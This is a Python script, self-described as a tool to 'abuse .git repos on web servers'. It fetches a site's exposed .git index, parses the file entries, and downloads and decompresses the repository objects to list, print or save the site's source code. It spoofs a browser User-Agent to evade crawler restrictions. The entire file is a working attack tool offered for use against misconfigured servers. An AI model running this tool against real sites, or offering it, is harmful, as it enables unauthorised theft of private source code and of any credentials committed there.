#!/usr/bin/env python3
import struct
import binascii
import sys
import urllib.request
import urllib.parse
import argparse
import os
import fnmatch
import zlib

def error(facility, logstr):
	log("error", logstr)
	exit(1)

def log(facility, logstr):
	if verbose or facility == "error":
		print(f"[{facility}] {logstr}")

# expects a file pointer to a downloaded index file
# returns a dictionary of file entries
def readindex(indexfile):
	buffer = indexfile.read(12)

	# Parse the header
	(ident, version, objects) = struct.unpack(">4sLL", buffer)

	if ident != b"DIRC":
		error("index","Not a git index file")
	if version not in range(2,3):
		error("index",f"Unknown version of git index file: {version}")

	entries=[]

	for i in range(0, objects):
		entry = {}
		statinfo = {}
		statinfo['ctime'] = struct.unpack(">LL", indexfile.read(8))
		statinfo['mtime'] = struct.unpack(">LL", indexfile.read(8))
		buffer = indexfile.read(24)
		( statinfo['dev'], statinfo['inode'], statinfo['mode'],
		  statinfo['uid'], statinfo['gid'], statinfo['size'] ) = \
		  struct.unpack(">LLLLLL", buffer)

		entry['statinfo'] = statinfo
		entry['id'] = binascii.hexlify(indexfile.read(20))
		entry['flags'] = struct.unpack(">H", indexfile.read(2))[0]
		
		namelength=(entry['flags'] & 0x7ff)
		data = indexfile.read(namelength)
		entry['name'] = data.decode()
		
		# deal with padding
		indexfile.read(1)
		indexfile.read((8 - ((namelength + 63) % 8))%8)

		# Add to output list
		entries.append(entry)
	
	return entries

# Manages a file - opens from cache or downloads to cache
# cachepath is global, url is the full url of the file
def opencachefile(url):
	cacheurl=urllib.parse.urlparse(url)
	cachename=f"{cachepath}{cacheurl.path}"	
	filename=os.path.basename(cachename)
	dirname=os.path.dirname(cachename)
	handle=None
	if os.path.exists(f"{cachepath}{cacheurl.path}"):
		log("cache",f"{url} found in cache")
		# we already have the file cached - use this 
		handle=open(cachename,"rb")
	else:
		log("cache",f"Getting {url}")
		# make sure there's a directory
		if not os.path.exists(dirname):
			os.makedirs(dirname)
	
		try:
			urllib.request.urlretrieve(f"{url}", filename=cachename)
		except urllib.error.HTTPError as e:
			raise Exception(f"Server error: {e.code}")		
		except urllib.error.URLError as e:
			raise Exception(f"Couldn't connect: {e.reason}")		
		else:
			handle=open(cachename,"rb")

	return handle

parser = argparse.ArgumentParser(description="Abuse .git repos on web servers")
parser.add_argument('--cache', help='Directory to cache downloaded files', nargs='?', default='.gitgrab')
parser.add_argument('--verbose', action='store_true', help='Be verbose')
parser.add_argument('--outdir',  help='Directory to store output', default=None)
parser.add_argument('url', help='base URL of site')
parser.add_argument('action', help='Action to perform: ls, download, view')
parser.add_argument('files', help='list of file globs', nargs='*')
args=parser.parse_args()

verbose=args.verbose
url=args.url
outdir=args.outdir

urlcheck=urllib.parse.urlparse(args.url)
if urlcheck.scheme not in ('http', 'https'):
	raise Exception(f"URL scheme not supported: {urlcheck.scheme}")

if outdir == None:
	outdir=urlcheck.hostname

# Set up cache
cachepath=f"{args.cache}/{urlcheck.hostname}{urlcheck.path}"
if not os.path.exists(cachepath):
	os.makedirs(cachepath)
if args.action == "download" and not os.path.exists(outdir):
	os.makedirs(outdir)

# set up a valid User-Agent to fool any spidering restrictions
opener = urllib.request.build_opener()
opener.addheaders = [('user-agent','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0')]
urllib.request.install_opener(opener)

log("main","Parsing index file")
try:
	cachefile=opencachefile(f"{url}/.git/index")
except Exception as e:
	error("main",f"Could not obtain git index file: {e.args[0]}")
entries=readindex(cachefile)

if args.action == "ls":
	for entry in entries:
		print(entry['name'])
	exit(0)

if args.action == "download" or args.action == "view":
	files=set()
	params=args.files
	if params==[]:
		params=['*']
	for file in params:
		outputfiles=fnmatch.filter([x['name'] for x in entries], file)
		files=set().union(files,outputfiles)
	log("download",f"Files to extract: {files}")

	for file in files:
		# Get entry from entries
		entry=next(entry for entry in entries if entry['name'] == file)
		# Get hash directory
		first=entry["id"][0:2].decode()
		rest =entry["id"][2:].decode()
		if args.action == "download":
			print(f"Downloading {entry['name']}")
		log("download",f"Extracting {entry['name']}")
		try:
			thisfile=opencachefile(f"{url}/.git/objects/{first}/{rest}")
			# Now we have it we can compress the data (!)
			decompressed=zlib.decompress(thisfile.read())
		except Exception as e:
			log("error",f"Could not obtain git object file for {file}: {e.args[0]}")
			continue

		# Now write it to a file
		if args.action == "download":
			outfile=f"{outdir}/{entry['name']}"
			if not os.path.exists(os.path.dirname(outfile)):
				os.makedirs(os.path.dirname(outfile))
			output=open(outfile,"wb")
			type=decompressed[:5].decode()
			data=decompressed[decompressed.find(b'\0')+1:]
			output.write(data)
			output.close()
		else:
			data=decompressed[decompressed.find(b'\0')+1:].decode()
			print(data)
	exit(0)

print(f"Unknown command: {args.action}") 

